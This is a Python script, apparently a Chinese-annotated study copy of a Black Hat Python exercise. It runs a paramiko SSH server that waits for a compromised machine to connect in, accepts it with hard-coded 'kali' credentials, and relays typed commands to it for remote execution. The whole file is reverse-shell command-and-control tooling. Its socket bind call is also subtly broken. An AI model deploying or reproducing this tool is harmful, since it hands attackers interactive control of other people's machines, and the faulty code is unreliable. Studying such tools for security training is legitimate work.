import os.path
import socket
import sys
import threading
import paramiko

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
        # request 的 channel ID 
    def check_channel_request(self, kind, chanid):
        # 'session' channel: 在遠端伺服器上執行 shell 或是 command
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        # If the channel type is not 'session', the channel request is denied for administrative reasons
        # 如果不是 session channel 的話， channel request 因為 administrative reasons 被拒
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if username =='kali' and password== 'kali':
            return paramiko.AUTH_SUCCESSFUL


if __name__ == '__main__':
    server = '192.168.1.207'
    ssh_port = 2222

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # 開啟 socket 監聽器
        sock.bind(server, ssh_port)
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)

    # 設置權限認證方式，使用 network socket ('client') 
    # 開啟 'Transport 物件' 使得 SSH protocol 可以利用加密連線進行傳輸
    bhSession = paramiko.Transport(client)
    # 建立 Paramiko RSAKey 類別的物件, 表示為 RSA private key
    bhSession.add_server_key(HOSTKEY)
    # 建立一個 Server 的物件
    server = Server()
    bhSession.start_server(server=server)

    # 20: 20 秒 timeout，接收 incoming channel
    chan = bhSession.accept(20)
    if chan is None:
        print("*** No channel.")
        sys.exit(1)

    print('[+] Authenticated!')
    # 接收和印出 channel 資料
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')

    try:
        while True:
            command = input("Enter Command: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break

    except KeyboardInterrupt:
        bhSession.close()








